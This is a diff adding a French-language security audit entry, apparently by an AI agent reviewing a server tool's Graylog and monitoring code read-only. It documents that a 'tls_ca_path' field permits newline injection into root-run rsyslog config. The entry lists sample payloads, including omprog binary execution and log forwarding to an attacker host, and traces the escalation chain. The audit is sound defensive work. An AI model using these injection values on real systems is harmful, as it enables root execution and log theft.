@@ -23048,3 +23048,96 @@ copies : `base seule` -> code 0, `base + prod` -> « invalid compose project ».
 > `docker-compose.prod.yml` existait. »* **Une epreuve qui ne connait pas tous les fichiers de sa
 > composition eprouve un sous-ensemble et rend un verdict d'ensemble.**
 
+---
+
+## E-538 — ⛔ `tls_ca_path` ATTEINT LA GRAMMAIRE RSYSLOG : LE SHELL EST PROTEGE, LE PUITS NON
+
+**Mesure du 2026-09-09**, sur demande de la session 8 : qualifier les 3 dernieres commandes root
+INDIRECTES de `graylog.py` et `monitoring.py`. **Lecture seule** — aucune commande modifiee, aucune
+config Graylog ecrite, aucune machine jointe, rien redemarre.
+
+**Deux des trois sites sont surs par CONSTRUCTION. Le troisieme est EXPLOITABLE, et pas par le shell.**
+
+### ① `graylog.py:300` — `install_cmd` : SUR
+
+    f"fi && {'apt-get install -y rsyslog-gnutls' if cfg['protocol'] == 'tls' else 'true'}"
+
+    ORIGINE          deux LITTERAUX de la fonction
+    NEUTRALISATION   INEXPRIMABLE PAR CONSTRUCTION
+
+*La condition lit une entree (`cfg['protocol']`, par ailleurs sur liste blanche `_VALID_PROTOCOLS`), mais
+la valeur INTERPOLEE est toujours l'une de deux constantes.* **Une entree qui CHOISIT n'est pas une entree
+qui FOURNIT** — et c'est exactement la forme `IfExp` que son instrument ne voit pas (son piege ②), benigne
+ici.
+
+### ② `graylog.py:318` — `write_cmd` : ⛔ EXPLOITABLE PAR LE PUITS
+
+    f"printf '%s' '{b64}' | base64 -d > {_RW_FORWARD_CONF} && chmod 644 {_RW_FORWARD_CONF}"
+
+    b64                 base64.b64encode(...)        ALPHABET base64      sur
+    _RW_FORWARD_CONF    litteral de module, l.59      1 affectation       sur
+    -> COTE SHELL, CE SITE EST IRREPROCHABLE.
+
+**Mais le contenu ecrit est `_build_forward_conf(cfg)` (l.124), et il atterrit dans
+`/etc/rsyslog.d/99-rootwarden-graylog-forward.conf`, relu par rsyslog QUI TOURNE EN ROOT.** *Le puits n'est
+pas le shell : c'est la grammaire rsyslog.*
+
+    valeur         origine   garde                                          verdict
+    host           ENTREE    _HOST_RE.fullmatch ^[a-zA-Z0-9._-]{1,253}$      REJET, ancre 2 bouts
+    port           ENTREE    int() + 1<=p<=65535                             TYPAGE + BORNE
+    rl_burst/_int  ENTREE    int() + bornes                                  TYPAGE + BORNE
+    ⛔ ca          ENTREE    len<=255  ET  startswith('/')  — RIEN D'AUTRE   INSUFFISANT
+
+**Eprouve dans les DEUX sens, en logique pure, hors service :**
+
+    ACCEPTE  /etc/ssl/certs/ca-certificates.crt              <- temoin positif
+    ACCEPTE  /a\n$ActionSendStreamDriverAuthMode anon         <- directive injectee
+    ACCEPTE  /a\nmodule(load="omprog")                        <- chargement de module
+    ACCEPTE  /a\naction(type="omprog" binary="/tmp/x")        <- EXECUTION d'un binaire PAR ROOT
+    ACCEPTE  /a\n*.* @@attaquant:514                          <- reexpedition de TOUS les journaux
+    refuse   etc/ssl/x.crt        (pas de / initial)
+    refuse   /aaaa…  >255         (trop long)
+
+    et pour comparaison, la MEME batterie sur host  ->  TOUT refuse, temoin positif accepte
+
+> **La garde refuse exactement ce qu'elle borne — la longueur et le `/` initial — et accepte tout le
+> reste, dont le SAUT DE LIGNE, qui est le separateur de la grammaire rsyslog.** *`.strip()` ne retire que
+> les bords : un saut de ligne INTERIEUR passe.*
+
+**CHAINE COMPLETE** : `POST /graylog/config` (`role:2` + `can_manage_graylog`) avec `protocol='tls'` et un
+`tls_ca_path` porteur d'un saut de ligne → stocke en base → `POST /graylog/deploy` (`role:2` +
+`can_manage_graylog` + `require_machine_access`) → ecrit sur la machine → **rsyslog, en root, charge la
+directive.** *Elevation d'un role 2 du portail vers une execution root sur toute machine accessible, sans
+detenir d'identifiant SSH.*
+
+### ⚠ ET LA GARDE DOMINE BIEN — CE N'EST PAS LE DEFAUT
+
+*Sa question etait « la garde domine-t-elle tous les chemins ? ». **Oui.*** `graylog_config` a **UN SEUL
+ecrivain dans tout le depot** — `graylog.py:222` (UPDATE) et `:229` (INSERT), tous deux dans `save_config`
+**apres** les validations. Temoin negatif : une table forgee rend 0.
+
+> **Le defaut n'est pas une garde contournee : c'est une garde qui DOMINE et qui est TROP FAIBLE pour l'un
+> de ses deux champs — faible precisement dans la dimension du puits.** *`host` est traite comme une
+> valeur hostile ; `ca` est traite comme un chemin de confiance, et rien ne dit pourquoi la distinction.*
+
+### ③ `monitoring.py:319` — `cmd` : SUR, ET PAR LA CLASSE LA PLUS FORTE
+
+    cmd = f"/sbin/shutdown -r +{delay_minutes} 'Reboot … dans {delay_minutes} min'"
+    delay_minutes = max(0, min(int(data.get('delay_minutes') or 0), 1440))     l.254
+
+    ORIGINE          ENTREE
+    NEUTRALISATION   TYPAGE + BORNAGE  ->  la chaine ne peut pas EXISTER
+
+*Et la branche `delay == 0` est un litteral pur.* **Reserve mineure, non securitaire** : `int('abc')` leve
+avant toute validation, donc une valeur non numerique rend 500 la ou 400 serait juste.
+
+### Ce que ce tour confirme de sa consigne
+
+> **« Nomme le puits, pas seulement le shell. »** *Sans cette phrase j'aurais qualifie `write_cmd` de sur
+> — il l'est, cote shell, et la mesure du b64 comme du litteral aurait ete juste.* **Le site le plus
+> irreprochable des trois est celui qui porte la faille**, parce que la question « la valeur interpolee
+> est-elle injectable ? » ne s'applique pas au bon langage.
+
+**⛔ Aucun correctif ecrit** : le geste appartient a la session 8 pour l'arbitrage, et tout correctif de
+securite va sur une branche `security/…`, jamais fusionne sans le mot de l'exploitant.
+
